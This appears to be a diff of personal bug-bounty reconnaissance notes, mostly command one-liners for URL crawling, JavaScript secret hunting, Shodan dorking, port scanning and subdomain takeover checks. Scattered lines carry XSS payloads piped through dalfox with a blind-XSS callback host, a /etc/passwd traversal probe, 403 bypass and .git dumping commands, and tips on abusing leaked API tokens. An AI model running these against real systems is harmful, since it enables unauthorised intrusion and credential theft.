@@ -174,540 +174,16 @@ how to use files everywhere
                
                           4 
                  finding parameters, 
-                 arjun , paramspider ,gf  check github
-                 
-                 paramspider -l domains.txt       check its saving of fills  
-                 
-        
-                 
-                 arjun -u https://www.example.com/file.php 
-                 paramspider -l domains.txt -s
-                 gospider -S domains.txt -o gospider
-                
-                 
-                 5
-                 URL RECON - EXTRACTION  and find sensitive files 
-                 gau, gospider, katana, gauplus
-                 
-               
-                 
-                      katana     check my katana docs down
-                 $ cat in_scope.txt        
-                login/
-                 admin/
-                 app/
-                wordpress/
-                 katana -u https://tesla.com -cs in_scope.txt
-                 
-                 gau
-                 echo "url" |gau | tee gau.txt
-                 
-                 cat gau.txt | unfurl keys | sort -u | grep -vE '_|/|\?|\\'
-                 cat gau.txt | grep -E '\.pdf' | sort -u | httpx -mc 200 | tee .gauPdf.txt        you could change the pdf to any file like xls,doc
-                gau  -oP '^https?://(?:[^/]*/){2}' gau.txt | sort -u | httpx -mc 200 | tee gau.txt
-                cat gau.txt | grep -Ei 'login|register|signup|signin|sign-in|sign-up|dashboard' | httpx -mc 200 > authendpoint.txt
-                
-                
-                
-               cat gau.txt | grep ? | tee param.txt     /// filter out url
-  gau $mytarget|egrep -iv '\.json'|grep -iE '\.js'|antiburl|awk '{print $4}' | xargs -I %% bash -c 'python3 SecretFinder.py -i %% -o cli -r "$anything"'
-                  
-                 gospider    check for goSpider github
-                    
-               Gospider -s (url) --subs --js || tee gospider.txt
-               gospider -S domains.txt -o gospider
-               
-               SINGLE TARGET
-               gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
-               
-               MUITIPLE TARGET 
-               gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
-               
-               GOSPIDER XSS
-               gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
-               gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
-               
-               
-              fillter files fron it
-             cat url.txt | awk "{print& 3}" | grep -E https:// | tee url.filter.txt
-                 cat gspider.txt |awk '[print$]' | grep -E url | tee gospider.txt
-                 
-                 katana -list urls.txt -v -jc -o katana
-                 katana -u http://testphp.vulnweb.com -js-crawl -d 5 -hl -filed endpoint | anew endpoint.txt
-                 
-                    # Search for testing point with gau and fff
-                  gau target -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee urls.txt
-                 sort -u urls.txt | fff -s 200 -o out/
-
-                 
-                 
-                 
-                     JAVASCRIPTS FILES
-                      
-               
-                 
-                   
-               cat gau.txt | grep ? | tee param.txt     /// filter out url
-                  
-              cat param.txt | grep -E '\.js$' | tee javascript.txt  filter out javascript
-               echo TARGET.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript' | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt
-               
-                   search javascript file
-                 gau -subs DOMAIN |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
-                  
-                   PART (1)
-                 curl -L -k -s https://www.example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | awk -F '//' '{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh -c "curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\"" | awk -F "['\"]" '{print $2}' | sort -fu
-                 PART 2
-                 curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\"; basename \"%\" | xargs -I \"#\" sh -c 'linkfinder.py -o cli -i #'"
-                 
-                 part 3
-                 curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\";curl -Lks \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
-                  part 4
-                  curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"'##### %\";curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
-                 
-                 
-                 
-             
-                 
-                 
-                 5
-                 
-                 find old url
-                 find all vulnerabulities in old url
-                 waybackurl, waybackmachine
-                 echo "url"  | waybackurl
-                 
-                 5@   virtual host
-               content discovery/params discovery  for bug hunting
-                 
-                 ffuf -w /wordlist/customlist/al.txt -c -u https://smart.com/FUZZ
-                  waybackurls target.com | grep "\\.js"|uniq|sort
-                 waybackurls target.com | grep "\\.js" | xargs -n1 -I@ curl -k @ | tee -a content.txt   
-                 
-                 
-                 cat domains.txt | waybackurls > urls.txt    
-                 
-                 for xss
-        waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | output.txt
-                   
-                    echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
-                    
-                    
-                    6
-                     SORTING OUT URL 
-                    gf,
-              
-                   cat | gf redirect | tee redirect.txt 
-                   
-                   
-                   # Search for testing point with gau and fff
-                   gau target -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee urls.txt
-                     sort -u urls.txt | fff -s 200 -o out/
-
-                 If you are using gau to fetch some archive data, make sure to exclude a lot of extensions with --blacklist flag:
-               cat t | gau --subs --blacklist png,jpg,jpeg,gif,mp3,mp4,svg,woff,woff2,etf,eof,otf,css,exe,ttf,eot
 
 
 
-               AUTOMATIC REPLACE WITH PAYLOAD
-               qsreplace .. check github
-               
-            
-
-               
-               10
-               visual recon
-                 eyewitness --web -f uniq.txt -d /path_to_save_screenshots  
-                    
-                 aquatone 
-                 cat targets.txt | aquatone
-                 $ cat hosts.txt | aquatone -ports 80,443,3000,3001
-               
-               11
-               google dorking
-               12
-               github doeking
-               https://www.lopseg.com.br/dork-helper#accessedLinks
-               https://github.com/gwen001/github-subdomains
-               
-               13
-               shodan dorking
-               
-               14
-               
-      Javascript Enumeration 
-        arjun
-      paramspider
-      katana            katana -list {domains.txt} -d 5 -jc | grep ".js$"  | uniq | sort
-      hawkrawler
-      gosipder
-      
-      cat targets.txt | hakrawler -d 5 -dr -insecure -t 10 -timeout 360 | tee hakrawler.txt
-      cat targets.txt | gospider -S - -q -d 5 -c 10 --sitemap --no-redirect -o gospider.txt
-      
-      #!/bin/bash
-
-hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b http://your.xss.ht
-      
-           
-          tip
-          echo "http://target.com" > target.txt
-cat traget.txt| grep ".js$" | uniq | jsleak -l -s
-cat traget.txt| grep ".js$" | uniq | jsecret
-           
-          tip  tip
-             EASIEST-WAY-TO-FIND-HIDDEN-API-FROM-JS-FILES
-      subfinder -d indeed.com -v -o subdomains.txt
-      cat subdomains.txt | waybackurls > waybackurls.txt
-      cat subdomains.txt | gau > gau.txt
-      waymore -i subdomains.txt -mode U > waymore.txt
-       Now will collect all urls into a single file naming as allurls
-        we will use extensor to find the endpoint file
-                 enter the file path :    home/the/filepath/
-                 enter the file extension  :  js
-                 enter the file name to save the url:  smart.txt
-      now we use SecretFinder to find apikeys from js file       
-       cat js.txt  | while read url; do python3 /home/kali/tools/SecretFinder/SecretFinder.py  -i $url -o cli; done   
-          It will shows all the possible credentials in js file , when you find it just report and enjoy the bounty
-          
-                  tip
-                  katana -list {domains.txt} -d 5 -jc | grep ".js$"  | uniq | sort
-                  Download SecretFinder (GitHub)
-                  cat {jsfilesgottenfromkatana.txt} | while read url; do python3 SecretFinder/SecretFinder.py  -i $url -o cli; done
-                  If anything sensitive found report it.
-         
-                  
-                  tip
-                  Subfinder -d Host.com | tee Domains.txt
-                  httpx -l Domains.txt | tee Live_Hosts.txt
-                  katana -u Live_Hosts.txt | grep ".js$" | tee Js_urls.txt
-                  cat Js_urls.txt | Mantra      check output to see if there is any api leak or token
-                   curl -H "Authorization: apikey token=X" http://Host.com/users    
-                   check if you can perform  API Calls using this token-> Add New User, Delete User ,Reset Any User Password
-                   
-                   
-                     ***  tomnonnom***
-                     gau example.net | unfurl -u paths
-                     sed 's#/#\n#g' paths.txt | sort -u         Extract all the parts
-                     gau example.net | unfurl -u keys
-                     ffuf -w paths.txt -u https://example.net/FUZZ
-
-          
-      
-  
-      # Normal Install
-      go install github.com/hakluke/hakrawler@latest
-      https://github.com/GerbenJavado/LinkFinder
-
-     # Single URL
-      echo https://target.com | hakrawler
-
-    # Multiple URLs
-     cat urls.txt | hakrawler
-
-     # Include subdomains
-      echo https://target.com | hakrawler -subs
-
-     # Get all subdomains of google, find the ones that respond to http(s), crawl them all
-     echo target.com | haktrails subdomains | httpx | hakrawler
-     #/bin/bash
-
-hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://your.xss.ht
-
-# save to .sh, and run bash program.sh target.com
-     
-      using subjs
-    $ cat urls.txt | subjs 
-   $ subjs -i urls.txt
-                
-                15
-     sensitive discovery in js files
-     SecretFinder.py
-      photon
-   
-               16
-                SUBDOMAIN TAKEOVER
-                https://github.com/Cyber-Guy1/Subdomainer
-     Hostilesubruteforce
-     ruby sub-brute.rb
-     
-     sub404
-     python3 sub404.py  -f
-     
-     subjack
-     
-     bbot
-    pipx install bbot
-     bbot -t evilcorp.com -f subdomain-enum
-     bbot -t evilcorp.com -f subdomain-enum -rf passive             //passive enum
-     httpx -l subdomains.txt -o live_subdomains.txt
-     
-     
-     methodology 
-     checck for subdomian using amass, sublistr
-       httpx -l subdomains.txt -o live_subdomains.txt       for live subdomian
-       use nuclei template to identify
-     nuclei -t <path>/nuclei-templates/takeovers/* -l all-live.txt
-     
-     
-     
-       
-     GOOGLE DORK FOR SUBDOMAIN TAKEOVER  
-     site:"*,example.com" intext:"PAGE NOT FOUND" | intext:"project not found" | intext:"repository not found" | intext:"domain does not exist" 
-     | intext:"this page cound not be found" | intext:"404 Blog is not found" | intext:"domain name is invalid" | intext:"No settings were found for this company"
-     cat domains.txt | assetfinder --subs-only | tee subdomains.txt; subjack -w subdomains.txt -ssl -t 100 | tee -a takeover.txt | grep -v "Vulnerable"
-     
-    
-                 
-      17
-     using nuclie  and nuclie templete
-     nuclei -u https://my.target.site    or   nuclei -l /path/to/list-of-targets.txt
-     nuclei -u my.target.site:5759
-     subfinder -d targetdomain.com -silent | httpx | nuclei -t technologies/tech-detect.yaml
-     nuclei -u https:// my.target.site -as      fingerprint website technology
-     nuclei -u https://my.target.site -t file/logs/python-app-sql-exceptions.yaml -t exposures/files/pyproject-disclosure.yaml  
-     user@kali:~/nuclei-templates$ nuclei -u https://my.target.site -t templates-35.txt
-     nuclei -u https://my.target.site -t file/logs -t exposures/files -t cves/2021
-      nuclei -u https://example.com -t ./cent-nuclei-templates -tags cve
-      nuclei -l urls.txt -t ./cent-nuclei-templates -tags cve
-       nuclei -u https://example.com -t nuclei-templates -tags cve
-        nuclei -l urls.txt -t nuclei-templates -tags cve
-
-     user@kali:~/nuclei-templates$ nuclei -u https://my.target.site -t template-categories.txt
-     nuclei -u https://jira.targetdomain.site -s critical,high,medium,low,info                          Select Templates By Severity (-s)
-     nuclei -l list-of-targets.txt -timeout 1                                                            when scanning many host
-     nuclei -l list-of-targets.txt -retries 3
-     nuclei -l targets-file.txt -resume /path/to/resume-file.cfg                                          resuming scan when temporary hut a scan
-     nuclei -u https://api.target.site -tags php,apache -H “Cookie:sc_=BPGFJcNgMwfePZBeJqoC838j8Mv4”        when authicated 
-     nuclei -l targets.txt -t my-template.yaml -p http://127.0.0.1:8080      proxy to burp
-     
-     check this two .. most use
-     nuclei -o output.txt -bs <> -c <> -rl <>
-     katana -u http://testphp.vulnweb.com --silent | nuclei -u - -t sqli_blind_sleep.yaml
- 
-        
-     
-     18
-     ADMIN LOGIN ONLINER
-     cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
-     
-     
-     CHECK FOR RCE
-     amass enum -active -d $1 -brute -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o amass.txt
-   cat amass.txt | aquatone -ports xlarge -out aqua_$1
-   nuclei -l aqua_$1/aquatone_urls.txt -t ~/nuclei-templates -es info -o nuclei_$1.txt
-     403 login Bypass
-   cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
-    git-dumper http://example.com/.git/ output
-     
-     
-     recon takeway tip     recon takeway tip        recon takeway tip       recon takeway tip
-    Certificate Search
-   using crt
-   curl -s "https://crt.sh/?O=Apple%20Inc.&output=json" | jq -r ".[].common_name" | tr A-Z a-z | unfurl format %r.%t | sort -u | tee apple.cert.txt
-   
-   Leveraging IP to Asset Discovery
-   http://ipip.net/    
-   Using CSP Headers
-     OSINT
-     subfinder -silent -dL domains.txt | anew subs.txt
-      while true; do subfinder -dL domains.txt -all | anew subs.txt | httpx | nuclei -t nuclei-templates/ | notify ; sleep 3600; don
-     
-     easy tip on bug bounty
-     search for app for technology       wappalyer
-     Shodan:  Search Query  for technology: Set-Cookie: CONCRETE5
-    To Hunt for Specific Organisation
-   Search Query: Set-Cookie: CONCRETE5 org:”Microsoft Corporation” 
-   shodan cli ->  shodan search “Set-Cookie: CONCRETE5” — fields ip_str,port — separator “ “ | awk ‘{print $1”:”$2}’ | tee -a shodan-concrete-ips.txt
-   Censys
-    Search Query: 443.https.get.body:concrete5
-    Writing Nuclei Template  of other vun
-    
-                               gauplus
-                   cat domain.txt | gauplus -subs | grep -i "\.xlsx" allurls.txt | anew xlsx.txt
-                    cat domain.txt | gauplus -subs | grep -i "\.sql" allurls.txt | anew sql.txt
-                     cat domain.txt | gauplus -subs | grep -i "\.log" allurls.txt | anew log.txt
-                      cat domain.txt | gauplus -subs | grep -i "\.bak" allurls.txt | anew bak.txt
-                       cat domain.txt | gauplus -subs | grep "=" | Gxss -c 100 | anew reflected.txt
-          cat domain.txt | gauplus -subs | grep "=" > url.txt; httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
-          
-       cat domain.txt | gauplus -subs | qsreplace "<intearcst-client domain>" | httpx     ssrf
-        cat domain.txt | gauplus -subs | grep -i "\.js$" > jsfiles.txt; while read url; do python3 secretfinder.py -l "$url"; done<jsfiles.txt
-          cat domain.txt | gauplus -subs | httpx -sc -nc | grep "403\|401" | anew unauted.txt      check 403 bypass github
-          
-          cat domain.txt | gauplus -subs | httpx -title | grep -l "admin\|login\|dashboard" | anew loginpanel.txt   //add more keyword
-          
-          /SUBDOMAIN-FUZZING-WORTH-35K-
-          ffuf -w /subdomain_megalist.txt -u 'https://adminFUZZ.Target.com' -c  -t 350 -mc all  -fs 0
-          Using Burp Match And Replace or using Burp intercept response by
-
-         change 302 Moved Temporarily to 200 OK
-          remove Location: /admin/Login.aspx?logout=y
-         remove html redirect code 
-      ***   1_Always check the redirect response in burp
-    ****  2_ If u found a bug in a subdomain and it fixed try Subdomain Fuzzing
-              you can use it this way
-
-     USING
-        FUZZ-admin.target.com E.G: cert-admin.target.com
-         adminFUZZ.target.com  E.G: admintest.target.com
-          FUZZadmin.target.com  E.G  testadmin.target.com
-          admin-FUZZ.target.com E.G: admin-stg.target.com
-         admin.FUZZ.target.com E.G: admin.dev.target.com 
-          
-          
-
-              KATANA
-          katana -list url_list.txt
-          echo “https://tesla.com” | katana
-          katana -u https://tesla.com,https://google.com
-          subfinder -d tesla.com -silent | httpx -silent | katana
-          katana scan -u target.com --header "X-Requested-With: XMLHttpRequest" --header "Accept-Language: en-US,en;q=0.9
-          katana -list urls.txt  -silent -d 6 -rl 25 -jc -f qurl | tee gapkatana.txt   
-          katana scan -u target.com -p xss,sql
-   note : Katana supports multiple default fields such as url, path, fqdn, rdn, rurl, qurl, qpath, file, key, value, kv, dir, udir     https://github.com/projectdiscovery/katana?ref=blog.projectdiscovery.io#-field
-           katana -u https://yahoo.com -f qurl          
-               (No need waybackurls)
-     Example:
-     echo target | katana -passive -f qurl -pss waybackarchive,commoncrawl, alienvault | tee endpoints
-     
-     katana” to list all endpoints matching  regex to fetch only those urls having parameters and values (? And =)
-     katana -u https://redacted.com -fs dn -iqp -mr "\bhttps?:\/\/[^\s]+?\?[^\s]*=[^\s]*\b" -o katna.txt
-                       
- whatweb -a 3 (url)
- ping -c 1 (ip)
-fping -g (ip)/24  
-nmap -PEPM -sP -n (ip)/24 
 
 
-   PORT SCANNING 
-   NMAP 
-   nmap (url) -p80, 443 -F -A
-   nmpa (url) --top -ports 2000
-   nmap url -sV
-   nmap url -sV --version -intensity 8
-   nmap url -Sv --version - all
-    
- check /usr/share/nmap    for SCRIPTS 
- 
- nmap url --scripts =http-sql-injection
-  nmap url --scripts =firewall-bypass -sw
-nmap --scripts "discovery,ftp*,ssh*,http-vuln*,mysql-vuln*,imap-*,pop3-* -il ./nmap_input.txt
-masscan -p1-65535 -il  ./dnsprobe_ip.txt -ol ./masscan_output.txt
 
-     NAABU
-    naabu -host url -p8080
-    
-    MAASSCAN
-    masscan ip/24 p80, 443
-    masscan ip/24 --top -ports
     
 
-Dangerously fast dns/network/port scanner, all-in-one.        check it more  and also not  yet download
-skanuvaty --target nmap.org --concurrency 16 --subdomains-file /usr/share/dnsenum/dns.txt       
 
 
- theHarvester -d  digitalpacific.com.au -b "anubis, baidu, bing, binaryedge, bingapi, bufferoverun, censys, certspotter, crtsh, dnsdumpster, duckduckgo, fullhunt, github-code, google, hackertarget, hunter, intelx, linkedin, linkedin_links, n45ht, omnisint, otx, pentesttools, projectdiscovery, qwant, rapiddns, rocketreach, securityTrails, spyse, sublist3r, threatcrowd, threatminer, trello, twitter, urlscan, virustotal, yahoo, zoomeye"
-    
-    
-    CENsYS
-    check for command line tools 
-     check for api-key 
-     python3 censys-subdomain.py (url)
-     Look for SSL certificate:
-    
-    
-    CHAOS  
-    CHECK FOR github to get the api-key to run it
-   
-
-     
-       
- check  ./cruze         //cruze : a script to automate all the lazy recon flow of the hunter with the tools great people have developed.
- ./cruze.sh example.com
- 
- tips  
- LEAKED CREDENTIALS         https://github.com/h4x0r-dz/Leaked-Credentials/
- 
- To search for leaked credentials using Google Chrome's Developer Tools and regex, follow these short steps:
-Open DevTools: In Chrome, navigate to the site you're inspecting, then open Developer Tools with Ctrl+Shift+I (Windows/Linux) or Cmd+Option+I (macOS).
-Go to Network Tab: Click on the "Network" tab.
-Enable Regex Search: Click the regex icon in the filter bar to enable regex mode.
-Refresh Page: Refresh the page to load all network requests.
-Apply Regex: Paste the given regex into the filter bar to search for patterns indicating leaked credentials.
-     
-((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\-_=]{8,64})['\"]
-
-then Review Matches: Manually inspect the filtered requests to identify potential leaks.
-
-
-USING BURP
- To search for leaked credentials in your target's scope using Burp Suite:
-
-Launch Burp Suite: Start Burp Suite and configure your browser to route traffic through it.
-Browse Your Target: Navigate through your target site and its subdomains to capture traffic in Burp Suite.
-Use the Regex in Search:
-Go to the "Burp" > "Search" tab.
-In the search type, choose "Regular expression".
-Paste the following regex:
-  (?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\-_=]{8,64})['\"]
-
-
-
-  
-  
-  JAVASCRIPT-FILE-FOR-BUG-HUNTERS
-  Manual Checking JavaScript:
-  
-   developer tools, --> HTML source code. Look for JavaScript references within the HTML file, which are often included using <script> tags. You can click on these references to view the JavaScript code  0r network tab-- > sourc file  --> open 
-   
- ***  Make sure you set up your burp proxy and keep it running in background. Take a deep dive into your target, thoroughly examining all its features and endpoints. Once you’re done, head over to the proxy tab and configure the filters as shown below to capture all the JavaScript files which are  scripts, shown only in scope items, and shown only js . Don’t forget to copy all the results and save them in a file called “link.txt”.   then run 
-            wget -P jsfiles -i link.txt    
-            all keywords manually “api key, api_key, password, secret, token, access, pwd, url, config, aws, s3” etc.  check and use the below regex
-         regix =  https://github.com/l4yton/RegHex
-         validate keys =  https://github.com/streaak/keyhacks
-         https://github.com/dirtycoder0124/formcrawler   ----> This script Crawls the website and finds the URLs that contain html forms.
-  
-  with tools
-  cat target.txt | gau | grep ".js" | tee js.txt
-cat target.txt | waybackurls | grep ".js" | tee -a js.txt
-cat target.txt | subjs | httpx -mc 200 | tee -a js.txt
-cat js.txt | Mantra
-cat js.txt | while read url;do python3 SecretFinder.py -i $url -o cli ; done > endpoint
-nuclei -l js.txt -t /root/nuclei-templates/http/exposures/ -o js_bugs.txt
-
-bash JSFScan.sh -l target -all -r -o result.ru
-
-  
- 
- pip install jsbeautifier. Then, you run it with js-beautify -o outfile.txt scripts.txt. This will output the file outfile.txt which you can easily browse through.
- 
- Now that we have a readable version of all the JavaScript code in one place, I like to start with Grep to get a feel of what I am expecting. The general command is grep --color -i term outfile.txt. You just change the word term with what you’re looking for. For example, try words like secret, admin, password or token to find hardcoded secrets. Alternatively, you can use a path prefix to look for endpoints. Say you noticed that all API endpoints start with /api/v1. In this case, you can substitute the word term in the grep command with /api/v1 to collect all the API endpoints.
- 
- 
- onliner to extract endpoints from JS files of a given host
- ./js at my kali/scan/
- 
-
-
-     
-                                                  
-keywords to look for  in javascript files:pathname url:, POST, api, GET, setRequestHeader, send( (yes with just one (, as it's used when making Ajax requests!. .headers, onreadystatechange, var {xyz} = , getParameter(), parameter, .theirdomain.com, apiKey. and also postMessage, messageListener, .innerHTML, document.write(, document.cookie, location.href, redirectUrl, window.hash.
-
-
- getting javasacript files
- source code/developers tools -> search for .js , then copy and paste in vscode and search for all ** word 
- 
-
- WAYBACKURL FOR BUG HUNTING
- # Only get all urls from wayback machine
-wayback_machine_downloader http://target.com -c 5 > all_urls.txt
-
-
-
-    waybackurl  (check the github usage)
-    echo "url" | waybackurl
-    
 
 
     waybackmachine
@@ -732,6 +208,10 @@ grep "\.txt"
 ~ "\.zip"
 ~ "\.config"     
 
+
+     tip
+     You do not need fresh assets, you need to check functionalities and try to register by company's mail and do not forget email discovery like redteamers, sometimes it helps you😉 be hacker not hunter
+  If we assume the company name is test, you register as admin@test.com This is an example, check for dev, stage and etc
       
        
 
@@ -778,6 +258,12 @@ Ports:8443, 8080 Title: "Dashboard[Jenkins]" Product: Tomcat Hostname: example.c
      SHODAN FOR BUG HUNTING 
      assest discovery using shodan cli                   check nahamesec video on shodan
      
+     tip
+     1 to get your IPs for shordan dork 
+{sudo shodan download --limit 1000 myresults.json.gz 'DORK'}
+2 to print the & filter the results to live
+sudo shodan parse --fields ip_str,port --separator " " myresults.json.gz | awk '{print$1":"$2}' | httpx -o live-IPs.txt
+     
      ssl:redacted.com "200"
      
  shodan init api-key
@@ -807,6 +293,146 @@ You can also negative search for specific content you don’t wish to search for
 https://www.shodan.io/search?query=org%3A%22Amazon%22+ssl%3A%22Paypal%22
 https://www.shodan.io/search?query=http.component%3A%22jenkins%22
 https://www.shodan.io/search?query=html%3A%22Dashboard+Jenkins%22
+
+
+   Some Shodan Dorks that might useful in Bug Bounty. 
+ssl:example.com http.status:200 http.title:”setup”                                 ssl:example.com http.status:200 -http.title:“Authorization required”
+1. org:"http://target. com" 
+2. http.status:"<status_code>" 
+3. product:"<Product_Name>" 
+4. port:<Port_Number> “Service_Message” 
+5. port:<Port_Number> “Service_Name” 
+6. http.component:"<Component_Name>" 
+7. http.component_category:"<Component_Category> 
+8. http.waf:"<firewall_name>" 
+9. http.html:"<Name>" 
+10. http.title:"<Title_Name>" 
+11. ssl.alpn:"<Protocol>" 
+12. http.favicon.hash:"<Favicon_Hash>" 
+13. net:"<Net_Range>" (for e.g. 104.16.100.52/32) 
+14. http://ssl.cert.subject.cn:"<http://Domain .com>" 
+15. asn:"<ASnumber>" 
+16. hostname:"<hosthame>" 
+17. ip:"<IP_Address>" 
+18. all:"<Keyword>" 
+19. “Set-Cookie: phpMyAdmin” 
+20. “Set-Cookie: lang=" 
+21. “Set-Cookie: PHPSESSID" 
+22. “Set-Cookie: webvpn” 
+23. “Set-Cookie:webvpnlogin=1" 
+24. “Set-Cookie:webvpnLang=en” 
